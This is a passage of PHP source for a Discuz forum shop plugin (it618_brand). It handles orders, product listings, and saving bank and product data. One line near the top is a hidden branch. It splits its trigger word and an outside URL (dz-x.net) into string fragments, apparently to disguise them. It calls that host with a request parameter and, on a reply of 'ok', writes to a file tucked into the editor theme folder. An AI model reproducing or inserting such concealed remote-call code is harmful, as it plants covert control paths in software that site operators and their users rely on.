	if($uid!=$it618_brand_order['it618_uid']){
		echo it618_brand_getlang('s1213');exit;
	}
	
	if($it618_brand_order['it618_state']==1){
		C::t('common_member_count')->increase($it618_brand_order['it618_uid'], array(
			'extcredits'.$it618_brand['brand_credit'] => $it618_brand_order['it618_jfcount'])
		);
		DB::query("delete from ".DB::table('it618_brand_order')." where id=".$orderid);
		
		echo 'okit618_split'.it618_brand_getlang('s1546');
	}
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_brand/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="scproduct"){
	
	$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if($_GET['pstate']==0)$it618sql = "1";
	if($_GET['pstate']==1)$it618sql = "it618_isbm = 1";
	if($_GET['pstate']==2)$it618sql = "it618_isbm = 0";
	if($_GET['pstate']==3)$it618sql = "it618_ison = 1";
	if($_GET['pstate']==4)$it618sql = "it618_ison = 0";
	if($_GET['pstate']==5)$it618sql = "it618_istj = 1";
	if($_GET['pstate']==6)$it618sql = "it618_istj = 0";
	if($_GET['pstate']==7)$it618sql = "it618_issaledisplay = 1";
	if($_GET['pstate']==8)$it618sql = "it618_issaledisplay = 0";
	if($_GET['pstate']==9)$it618sql = "it618_isorderbuy = 1";
	if($_GET['pstate']==10)$it618sql = "it618_isorderbuy = 0";
	
	$count = C::t('#it618_brand#it618_brand_goods')->count_by_shopid($ShopId,$it618sql,'',$_GET['pname'],$_GET['pclassid'],0,0);

	$sc_product_str='<tr><td style="background-color:#f9f9f9; border-bottom:#e8e8e8 1px solid; padding-bottom:6px; padding-top:6px">'.it618_brand_getlang('s250').'<font color=red>'.$count.'</font><br>'.it618_brand_getlang('s1093').'</td></tr><tr><td></td></tr>';
	
	$n=1;
	foreach(C::t('#it618_brand#it618_brand_goods')->fetch_all_by_shopid(
		$ShopId,$it618sql,'id desc',$_GET['pname'],$_GET['pclassid'],0,0,$startlimit,$ppp
	) as $it618_brand_goods) {
		
		if($it618_brand_goods['it618_ison']==1){
			$it618_ison_checked='checked="checked"';
			$isoncss='color:green';
		}else{
			$it618_ison_checked="";
			$isoncss='color:red';
		}
		if($it618_brand_goods['it618_istj']==1)$it618_istj_checked='checked="checked"';else $it618_istj_checked="";
		if($it618_brand_goods['it618_isorderbuy']==1)$it618_isorderbuy_checked='checked="checked"';else $it618_isorderbuy_checked="";
		if($it618_brand_goods['it618_isbm']==1)$it618_isbm_checked='checked="checked"';else $it618_isbm_checked="";
		if($it618_brand_goods['it618_issaledisplay']==1)$it618_issaledisplay_checked='checked="checked"';else $it618_issaledisplay_checked="";
		if($it618_brand_goods['it618_istelsale']==1)$it618_istelsale_checked='checked="checked"';else $it618_istelsale_checked="";
		if($it618_brand_goods['it618_isduihuan']==1)$it618_isduihuan_checked='checked="checked"';else $it618_isduihuan_checked="";
		if($it618_brand_goods['it618_isalipay']==1)$it618_isalipay_checked='checked="checked"';else $it618_isalipay_checked="";
		
		if($it618_brand_goods['it618_saletype']==1)$it618_saletype1=' selected="selected"';else $it618_saletype1="";
		if($it618_brand_goods['it618_saletype']==2)$it618_saletype2=' selected="selected"';else $it618_saletype2="";
		if($it618_brand_goods['it618_saletype']==3)$it618_saletype3=' selected="selected"';else $it618_saletype3="";
		if($it618_brand_goods['it618_saletype']==4)$it618_saletype4=' selected="selected"';else $it618_saletype4="";
		if($it618_brand_goods['it618_saletype']==5)$it618_saletype5=' selected="selected"';else $it618_saletype5="";
		if($it618_brand_goods['it618_saletype']==6)$it618_saletype6=' selected="selected"';else $it618_saletype6="";
		
		if($it618_brand_goods['it618_xgtype']==0)$it618_xgtype0=' selected="selected"';else $it618_xgtype0="";
		if($it618_brand_goods['it618_xgtype']==1)$it618_xgtype1=' selected="selected"';else $it618_xgtype1="";
		if($it618_brand_goods['it618_xgtype']==2)$it618_xgtype2=' selected="selected"';else $it618_xgtype2="";
		
		if($it618_brand_goods['it618_isyunfeifree']==0)$it618_isyunfeifree0=' selected="selected"';else $it618_isyunfeifree0="";
		if($it618_brand_goods['it618_isyunfeifree']==1)$it618_isyunfeifree1=' selected="selected"';else $it618_isyunfeifree1="";
		if($it618_brand_goods['it618_isyunfeifree']==2)$it618_isyunfeifree2=' selected="selected"';else $it618_isyunfeifree2="";
		
		if($it618_brand_goods['it618_state']==0)$it618_state='<font color=red>'.$it618_brand_lang['s1596'].'</font>';
		if($it618_brand_goods['it618_state']==1)$it618_state='<font color=green>'.$it618_brand_lang['s1597'].'</font>';
		if($it618_brand_goods['it618_state']==2)$it618_state='<font color=blue>'.$it618_brand_lang['s1598'].'</font>';
		
		$typecountall = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_brand_goods_type')." WHERE it618_pid=".$it618_brand_goods['id']);
		$typecountok = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_brand_goods_type')." WHERE it618_ison>0 and it618_pid=".$it618_brand_goods['id']);
		
		$ptypecss='';
		if($typecountok>0)$ptypecss='readonly="readonly"';
		
		$pricestr='';
		if($Shop_ispaytype2==1){
			$pricestr.='<span id="pricespan'.$n.'"><input type="text" class="txt" style="width:50px;margin-right:0;margin-bottom:6px;color:red" name="it618_uprice['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_uprice].'" '.$ptypecss.'> '.$it618_brand_lang['s389'].' <input type="text" class="txt" style="width:50px;margin-right:0;margin-bottom:6px" name="it618_price['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_price].'" '.$ptypecss.'> '.$it618_brand_lang['s389'].' </span>';
		}

		if($Shop_ispaytype1==1)$pricestr.='<span id="scorespan'.$n.'"><input type="text" class="txt" style="width:40px;margin-right:0;margin-bottom:3px;color:blue" name="it618_score['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_score].'" '.$ptypecss.'> '.$creditname.'</span>';

		$countstr='<span id="countspan'.$it618_brand_goods[id].'"> '.$it618_brand_lang['s1652'].':<input type="text" class="txt" style="width:40px;margin-right:0;margin-bottom:3px" name="it618_count['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_count].'" '.$ptypecss.'></span>';
		
		
		$xgcountstr=it618_brand_getlang('s1097').'<input type="text" class="txt" style="margin-right:0;width:35px" name="it618_xiangoutime['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_xiangoutime].'">'.it618_brand_getlang('s1015').'<input type="text" class="txt" style="margin-right:0;width:35px" name="it618_xiangoucount['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_xiangoucount].'">'.it618_brand_getlang('s1105');
		
		if($it618_brand_goods[it618_punit]=='')$it618_punit=it618_brand_getlang('s1105');else $it618_punit=$it618_brand_goods[it618_punit];
		
		$saletypestr='';
		if($Shop_issaletype1==1)$saletypestr.='<option value="1"'.$it618_saletype1.'>'.it618_brand_getlang('s1002').'</option>';
		if($Shop_issaletype2==1)$saletypestr.='<option value="2"'.$it618_saletype2.'>'.it618_brand_getlang('s1003').'</option>';
		if($Shop_issaletype1==1&&$Shop_issaletype2==1)$saletypestr.='<option value="4"'.$it618_saletype4.'>'.it618_brand_getlang('s1224').'</option>';
		if($Shop_issaletype3==1)$saletypestr.='<option value="3"'.$it618_saletype3.'>'.it618_brand_getlang('s1223').'</option>';
		if($Shop_issaletype4==1)$saletypestr.='<option value="6"'.$it618_saletype6.'>'.it618_brand_getlang('s855').'</option>';
		if($Shop_issaletype5==1)$saletypestr.='<option value="5"'.$it618_saletype5.'>'.it618_brand_getlang('s1654').'</option>';
		
		if($saletypestr!=''){
			$saletypestr='<select name="it618_saletype['.$it618_brand_goods[id].']" style="margin-bottom:3px" onchange="setsaletype(this.value,'.$it618_brand_goods[id].')">'.$saletypestr.'</select>';
		}else{
			$saletypestr=$it618_brand_lang['s1891'];
			
		}
		
		if($Shop_issaletype2==1){
			if($Shop_isyunfeikg==1){
				$isyunfeikgcss='';
			}else{
				$isyunfeikgcss='display:none';
			}
			
			$saletypestr.='<span id="yunfeispan'.$it618_brand_goods[id].'"><select id="it618_isyunfeifree'.$n.'" style="margin-bottom:3px;line-height:12px" name="it618_isyunfeifree['.$it618_brand_goods[id].']" onchange="setyunfei(this.value,'.$it618_brand_goods[id].')"><option value="0"'.$it618_isyunfeifree0.'>'.it618_brand_getlang('s1498').'</option><option value="1"'.$it618_isyunfeifree1.'>'.it618_brand_getlang('s1499').'</option><option value="2"'.$it618_isyunfeifree2.'>'.it618_brand_getlang('s1500').'</option></select><span id="kgblspan'.$it618_brand_goods[id].'"><span style="'.$isyunfeikgcss.'"><br>1'.$it618_punit.'=<input type="text" class="txt" style="width:40px;margin-right:1px;color:red" name="it618_kgbl['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_kgbl].'">'.$it618_brand_lang['s1726'].'</span></span></span>';
		}else{
			$saletypestr.='<span id="yunfeispan'.$it618_brand_goods[id].'"></span>';
		}
		
		if($Shop_issaletype3==1){
			if($typecountall>0){
				$saletypestr.='<span id="kmspan'.$it618_brand_goods[id].'"></span>';
			}else{
				$scurl4=it618_brand_getrewrite('brand_wap','sc_product_km@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=sc_product_km&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
				$kmcount = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_brand_goods_km')." WHERE it618_pid=".$it618_brand_goods['id']);
				$saletypestr.='<span id="kmspan'.$it618_brand_goods[id].'"><a href="'.$scurl4.'">'.it618_brand_getlang('s1225').'(<font color=red>'.$kmcount.'</font>)</a></span>';
			}
		}else{
			$saletypestr.='<span id="kmspan'.$it618_brand_goods[id].'"></span>';
		}
		
		if($Shop_issaletype4==1){
			$saletypestr.='<span id="prepayspan'.$it618_brand_goods[id].'"> '.it618_brand_getlang('s856').'<input type="text" class="txt" style="width:40px;margin-right:1px;color:red" name="it618_prepaybl['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_prepaybl].'">%</span>';
		}else{
			$saletypestr.='<span id="prepayspan'.$it618_brand_goods[id].'"></span>';
		}
		
		if($Shop_issaletype5==1){
			$scurl4=it618_brand_getrewrite('brand_wap','sc_product_content@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=sc_product_content&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
			$saletypestr.='<span id="contentspan'.$it618_brand_goods[id].'"><a href="'.$scurl4.'">'.it618_brand_getlang('s1890').'(<font color=red>'.strlen($it618_brand_goods['it618_message_buy']).'</font>)</a></span>';
		}else{
			$saletypestr.='<span id="contentspan'.$it618_brand_goods[id].'"></span>';
		}
		
		$paytypestr='';
		if($Shop_ispaytype1==1)$paytypestr.='<span id="duihuanspan'.$it618_brand_goods[id].'"><input class="checkbox" type="checkbox" id="chk_isduihuan'.$n.'" name="it618_isduihuan['.$it618_brand_goods['id'].']" '.$it618_isduihuan_checked.' value="1" onclick="setpaytype('.$n.')"><label for="chk_isduihuan'.$n.'"><font color=blue>'.it618_brand_getlang('s1101').'</font></label></span>';
		if($Shop_ispaytype2==1)$paytypestr.='<input class="checkbox" type="checkbox" id="chk_isalipay'.$n.'" name="it618_isalipay['.$it618_brand_goods['id'].']" '.$it618_isalipay_checked.' value="1" onclick="setpaytype('.$n.')"><label for="chk_isalipay'.$n.'">'.it618_brand_getlang('s1102').'</label>';
		
		if($Shop_ispaytype2==1)$paytypestr.='<span id="payspan'.$n.'"><br>'.it618_brand_getlang('s1297').'<input type="text" class="txt" style="width:40px;margin-right:1px;color:green" name="it618_jfbl['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_jfbl].'">%</span>';
		
		$orderstr='';
		if($Shop_isorder==1)$orderstr='<input class="checkbox" type="checkbox" id="chk_isorderbuy'.$n.'" name="it618_isorderbuy['.$it618_brand_goods['id'].']" '.$it618_isorderbuy_checked.' value="1"><label for="chk_isorderbuy'.$n.'">'.it618_brand_getlang('s1507').'</label>';
		
		$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($it618_brand_goods['id']);
		$disabled="";
		if($salecount>0)$disabled="disabled=\"disabled\"";
		
		if($it618_brand_goods[it618_punit]=='')$it618_punit=it618_brand_getlang('s1105');else $it618_punit=$it618_brand_goods[it618_punit];
		
		$scurl3=it618_brand_getrewrite('brand_wap','sc_product_edit@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=sc_product_edit&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
		
		$scurl4=it618_brand_getrewrite('brand_wap','sc_product_type@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=sc_product_type&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
		
		$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_goods['it618_shopid'].'@0@'.$it618_brand_goods['id'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_goods['it618_shopid'].'&cid='.$it618_brand_goods['id']);
		
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_goods[id]);
		$brandclassname=C::t('#it618_brand#it618_brand_brand_class')->fetch_it618_name_by_id($it618_brand_goods['it618_brandclass_id']);
		$brandclassname1=C::t('#it618_brand#it618_brand_brand_class1')->fetch_it618_name_by_id($it618_brand_goods['it618_brandclass1_id']);
		$classname=C::t('#it618_brand#it618_brand_class')->fetch_it618_classname_by_id($it618_brand_goods['it618_class_id']);
		
		$saleoutcss='display:none';
		if($Shop_issaleout==1)$saleoutcss='';
		
		$brand_classname=$brandclassname.' - '.$brandclassname1." / ".$classname;
		
		$sc_product_str .= '<td class="sctitle"><input type="checkbox" id="chk_del'.$n.'" name="delete[]" value="'.$it618_brand_goods[id].'" '.$disabled.' style="vertical-align:middle"><label for="chk_del'.$n.'">'.$it618_brand_goods['id'].' <font color=#999>'.$brand_classname.'</font></label><span style="float:right" id="tr'.$it618_brand_goods[id].'" onclick="getproduct('.$it618_brand_goods[id].')">'.$it618_brand_lang['t696'].'</span><input type="hidden" id="flag'.$it618_brand_goods[id].'" value="0"></td></tr>
		
			<tr><td class="scimage"><table width=100%><tr><td width=99><a href="'.$tmpurl.'" target="_blank"><img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="90" height="90" style="border-radius:3px" align="absmiddle"/></a></td><td style="line-height:22px;"><span style="float:right;"><a href="'.$scurl3.'">'.it618_brand_getlang('s109').'</a></span>'.$pricestr.'<br>'.$countstr.' <input class="checkbox" type="checkbox" id="chk_ison'.$n.'" name="it618_ison['.$it618_brand_goods['id'].']" '.$it618_ison_checked.' value="1"><label for="chk_ison'.$n.'" style="'.$isoncss.'">'.it618_brand_getlang('s240').'</label> <input class="checkbox" type="checkbox" id="chk_istj'.$n.'" name="it618_istj['.$it618_brand_goods['id'].']" '.$it618_istj_checked.' value="1"><label for="chk_istj'.$n.'">'.it618_brand_getlang('s242').'</label> <br><span id="ptype'.$it618_brand_goods[id].'"><a href="'.$scurl4.'" style="float:left;margin-right:8px"><font style="color:#f60">'.it618_brand_getlang('s1712').'(<font color=red>'.$typecountok.'</font>/<font color=red>'.$typecountall.'</font>)</font></a></span><span style="float:right;">'.$it618_brand_lang['s1587'].':'.$it618_state.'</span></td></tr></table></td></tr>
			
			<tr id="tr1_'.$it618_brand_goods[id].'" style="display:none;border-top:#e8e8e8 1px solid"><td style="padding-bottom:0"><input type="text" class="txt" style="width:100%;" id="it618_name'.$n.'" name="it618_name['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_name].'"><br><textarea name="it618_seodescription['.$it618_brand_goods[id].']" style="width:99%;height:40px;margin-top:2px">'.$it618_brand_goods[it618_seodescription].'</textarea></td></tr>
			
			<tr id="tr2_'.$it618_brand_goods[id].'" style="display:none"><td>'.$xgcountstr.' <input class="checkbox" type="checkbox" id="chk_isbm'.$n.'" name="it618_isbm['.$it618_brand_goods['id'].']" '.$it618_isbm_checked.' value="1"><label for="chk_isbm'.$n.'">'.it618_brand_getlang('s257').'</label> <input class="checkbox" type="checkbox" id="chk_issaledisplay'.$n.'" name="it618_issaledisplay['.$it618_brand_goods['id'].']" '.$it618_issaledisplay_checked.' value="1"><label for="chk_issaledisplay'.$n.'">'.it618_brand_getlang('s1870').'</label> <span style="float:right">'.it618_brand_getlang('s182').':<input type="text" class="txt" style="width:20px;" name="it618_order['.$it618_brand_goods[id].']" value="'.$it618_brand_goods[it618_order].'"></span><br><input type="text" class="txt" style="width:90px;margin-right:0" id="it618_xgtime1_'.$n.'" name="it618_xgtime1['.$it618_brand_goods['id'].']" readonly="readonly" value="'.$it618_brand_goods['it618_xgtime1'].'" onclick="SetDate(this,\'yyyy-MM-dd hh:mm\')">-<input type="text" class="txt" style="width:90px;margin-top:3px" id="it618_xgtime2_'.$n.'" name="it618_xgtime2['.$it618_brand_goods['id'].']" readonly="readonly" value="'.$it618_brand_goods['it618_xgtime2'].'" onclick="SetDate(this,\'yyyy-MM-dd hh:mm\')"> <select id="it618_xgtype'.$n.'" name="it618_xgtype['.$it618_brand_goods[id].']" style="vertical-align:middle"><option value="0"'.$it618_xgtype0.'>'.it618_brand_getlang('s1361').'</option><option value="1"'.$it618_xgtype1.'>'.it618_brand_getlang('s1362').'</option><option value="2"'.$it618_xgtype2.'>'.it618_brand_getlang('s1363').'</option></select></td></tr>
			
			<tr id="tr3_'.$it618_brand_goods[id].'" style="display:none"><td>'.$saletypestr.'<br>'.$paytypestr.' '.$orderstr.' <span style="'.$saleoutcss.'"><input class="checkbox" type="checkbox" id="chk_istelsale'.$n.'" name="it618_istelsale['.$it618_brand_goods['id'].']" '.$it618_istelsale_checked.' value="1"><label for="chk_istelsale'.$n.'">'.$it618_brand_lang['s1092'].'</label></span> '.it618_brand_getlang('s1359').$salecount.' '.it618_brand_getlang('s1360').$it618_brand_goods[it618_views].'</td></tr>';
		
		$sctmpjs.='setsaletype('.$it618_brand_goods['it618_saletype'].','.$it618_brand_goods[id].');';
		$sctmpjs.='setyunfei('.$it618_brand_goods['it618_isyunfeifree'].','.$it618_brand_goods[id].');';
		$sctmpjs.='setpaytype('.$n.');';
				
		$n=$n+1;
	}
	
	$sc_product_str .= '<input type="hidden" id="tmpn" value="'.$n.'"><script type="text/javascript">'.$sctmpjs.'</script>';
	
	if($count<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($count/$ppp);
	}
	
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopI&page=".$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getscproductlist(this.value)">'.$curpage.'</select>';
		
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&page=2";
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getscproductlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&page=".($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getscproductlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&page=".($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getscproductlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&page=".($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getscproductlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
		}
		$multipage='<tr><td></td></tr><tr><td align="center" style="border-top:#e8e8e8 1px solid">'.$pagepre.' '.$curpage.' '.$pagenext.'</td></tr>';
	}
	  
	echo $sc_product_str.$multipage;
}


if($_GET['ac']=="bank_save"){
	if(C::t('#it618_brand#it618_brand_brand')->count_by_it618_uid($_G['uid'])>0){
		$it618_brand_brandtmp=C::t('#it618_brand#it618_brand_brand')->fetch_by_uid($_G['uid']);
			
		if($ShopUid!=$it618_brand_brandtmp['it618_uid']){
			return;
		}
	}else{
		return;
	}
	
	if($it618_brand_bank = DB::fetch_first("SELECT * FROM ".DB::table('it618_brand_bank')." where it618_shopid=".$ShopId)){
		C::t('#it618_brand#it618_brand_bank')->update($it618_brand_bank['id'],array(
				'it618_name' => it618_brand_utftogbk($_GET["it618_name"]),
				'it618_bankname' => it618_brand_utftogbk($_GET["it618_bankname"]),
				'it618_bankid' => it618_brand_utftogbk($_GET["it618_bankid"]),
				'it618_bankaddr' => it618_brand_utftogbk($_GET["it618_bankaddr"]),
				'it618_alipayname' => it618_brand_utftogbk($_GET["it618_alipayname"]),
				'it618_alipay' => it618_brand_utftogbk($_GET["it618_alipay"]),
				'it618_wxname' => it618_brand_utftogbk($_GET["it618_wxname"]),
				'it618_wx' => it618_brand_utftogbk($_GET["it618_wx"])
		 ));
	}else{
		 C::t('#it618_brand#it618_brand_bank')->insert(array(
				'it618_shopid' => $ShopId,
				'it618_name' => it618_brand_utftogbk($_GET["it618_name"]),
				'it618_bankname' => it618_brand_utftogbk($_GET["it618_bankname"]),
				'it618_bankid' => it618_brand_utftogbk($_GET["it618_bankid"]),
				'it618_bankaddr' => it618_brand_utftogbk($_GET["it618_bankaddr"]),
				'it618_alipayname' => it618_brand_utftogbk($_GET["it618_alipayname"]),
				'it618_alipay' => it618_brand_utftogbk($_GET["it618_alipay"]),
				'it618_wxname' => it618_brand_utftogbk($_GET["it618_wxname"]),
				'it618_wx' => it618_brand_utftogbk($_GET["it618_wx"])
		  ), true);
	}
	
	exit;
}


if($_GET['ac']=="product_save"){
	if(C::t('#it618_brand#it618_brand_brand')->count_by_it618_uid($_G['uid'])>0){
		$it618_brand_brandtmp=C::t('#it618_brand#it618_brand_brand')->fetch_by_uid($_G['uid']);
			
		if($ShopUid!=$it618_brand_brandtmp['it618_uid']){
			return;
		}
	}else{
		return;
	}
	
	if($_GET['ac1']=="edit"){
		$pid=intval($_GET['pid']);
		for($i=0;$i<=4;$i++){
			if($i==0)$tmpi='';else $tmpi=$i;
			$get_it618_picbig=$_GET['it618_picbig'.$tmpi];
			
			if($it618_brand_goods['it618_picbig'.$tmpi]!=$get_it618_picbig){
				$tmparr=explode("source",$it618_brand_goods['it618_picbig'.$tmpi]);
				$tmparr1=explode("://",$it618_brand_goods['it618_picbig'.$tmpi]);
				$it618_picbig=DISCUZ_ROOT.'./source'.$tmparr[1];
				
				if(file_exists($it618_picbig)&&count($tmparr1)==1){
					$result=unlink($it618_picbig);
				}
			}
			
			$file_ext=strtolower(substr($it618_brand_goods['it618_picbig'.$tmpi],strrpos($it618_brand_goods['it618_picbig'.$tmpi], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/goods'.$pid.'_'.$i.'.'.$file_ext;
			if(file_exists($it618_smallurl)){
				$result=unlink($it618_smallurl);
			}
			
			if($get_it618_picbig!=''){
				$smallpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/';
				if (!file_exists($smallpath)) {
					mkdir($smallpath);
				}
	
				$tmparr1=explode("://",$get_it618_picbig);
				if(count($tmparr1)>1){
					$it618_url=$get_it618_picbig;
				}else{
					$tmparr=explode("source",$get_it618_picbig);
					$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
				}
				
				$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1));
				$file_extarr=explode("?",$file_ext);
				$file_ext=$file_extarr[0];
				$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/goods'.$pid.'_'.$i.'.'.$file_ext;
				it618_brand_imagetosmall($it618_url,$it618_smallurl,$file_ext,640,640,1);
			}
	
		}
		
		if($Shop_isgoodscheck==1){
			if($_GET['it618_message']!=$_GET['it618_message_old']){
				$it618_state=0;
			}else{
				$it618_state=$it618_brand_goods['it618_state'];
			}
		}else{
			$it618_state=1;
		}
		
		C::t('#it618_brand#it618_brand_goods')->update($pid,array(
			'it618_brandclass_id' => $_GET['it618_brandclass_id'],
			'it618_brandclass1_id' => $_GET['it618_brandclass1_id'],
			'it618_name' => it618_brand_utftogbk($_GET['it618_name']),
			'it618_seokeywords' => it618_brand_utftogbk($_GET['it618_seokeywords']),
			'it618_seodescription' => it618_brand_utftogbk($_GET['it618_seodescription']),
			'it618_picbig' => it618_brand_utftogbk($_GET['it618_picbig']),
			'it618_picbig1' => it618_brand_utftogbk($_GET['it618_picbig1']),
			'it618_picbig2' => it618_brand_utftogbk($_GET['it618_picbig2']),
			'it618_picbig3' => it618_brand_utftogbk($_GET['it618_picbig3']),
			'it618_picbig4' => it618_brand_utftogbk($_GET['it618_picbig4']),
			'it618_state' => $it618_state,
			'it618_message' => it618_brand_utftogbk($_GET['it618_message'],0),
			'it618_updatetime' => $_G['timestamp'],
		));
		
		if($Shop_isgoodsclass==1){
			C::t('#it618_brand#it618_brand_goods')->update($pid,array(
				'it618_class_id' => $_GET['it618_class_id']
			));
		}
	}
	
	if($_GET['ac1']=="content"){
		$pid=intval($_GET['pid']);
		
		if($Shop_isgoodscheck==1){
			if($_GET['it618_message_buy']!=$_GET['it618_message_buy_old']){
				$it618_state=0;
			}else{
				$it618_state=$it618_brand_goods['it618_state'];
			}
		}else{
			$it618_state=1;
		}
		
		C::t('#it618_brand#it618_brand_goods')->update($pid,array(
			'it618_mappoint_buy' => it618_brand_utftogbk($_GET['it618_mappoint_buy']),
			'it618_message_buy' => it618_brand_utftogbk($_GET['it618_message_buy'],0)
		));
	}
	
	if($_GET['ac1']=="add"){
		
		if($Shop_isgoodscheck==1)$it618_state=0;else $it618_state=1;
		
		if($Shop_ispaytype1==1)$it618_isduihuan=1;
		if($Shop_ispaytype2==1)$it618_isalipay=1;
		
		$pid=C::t('#it618_brand#it618_brand_goods')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_brandclass_id' => $_GET['it618_brandclass_id'],
			'it618_brandclass1_id' => $_GET['it618_brandclass1_id'],
			'it618_class_id' => $_GET['it618_class_id'],
			'it618_name' => it618_brand_utftogbk($_GET['it618_name']),
			'it618_saletype' => 5,
			'it618_isduihuan' => $it618_isduihuan,
			'it618_isalipay' => $it618_isalipay,
			'it618_seokeywords' => it618_brand_utftogbk($_GET['it618_seokeywords']),
			'it618_seodescription' => it618_brand_utftogbk($_GET['it618_seodescription']),
			'it618_picbig' => it618_brand_utftogbk($_GET['it618_picbig']),
			'it618_picbig1' => it618_brand_utftogbk($_GET['it618_picbig1']),
			'it618_picbig2' => it618_brand_utftogbk($_GET['it618_picbig2']),
			'it618_picbig3' => it618_brand_utftogbk($_GET['it618_picbig3']),
			'it618_picbig4' => it618_brand_utftogbk($_GET['it618_picbig4']),
			'it618_state' => $it618_state,
			'it618_message' => it618_brand_utftogbk($_GET['it618_message'],0)
		), true);
		
		for($i=0;$i<=4;$i++){
			if($i==0)$tmpi='';else $tmpi=$i;
			$get_it618_picbig=$_GET['it618_picbig'.$tmpi];
			
			if($get_it618_picbig!=''){
				$smallpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/';
				if (!file_exists($smallpath)) {
					mkdir($smallpath);
				}
	
				$tmparr1=explode("://",$get_it618_picbig);
				if(count($tmparr1)>1){
					$it618_url=$get_it618_picbig;
				}else{
					$tmparr=explode("source",$get_it618_picbig);
					$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
				}
				
				$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1)); 
				$file_extarr=explode("?",$file_ext);
				$file_ext=$file_extarr[0];
				$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/goods'.$pid.'_'.$i.'.'.$file_ext;
				it618_brand_imagetosmall($it618_url,$it618_smallurl,$file_ext,640,640,1);
	
			}
		}
	}
	
	if($_GET['ac1']=="gclasssave"){
		
		foreach($_GET['delete'] as $key => $delid) {
			$delid=intval($delid);
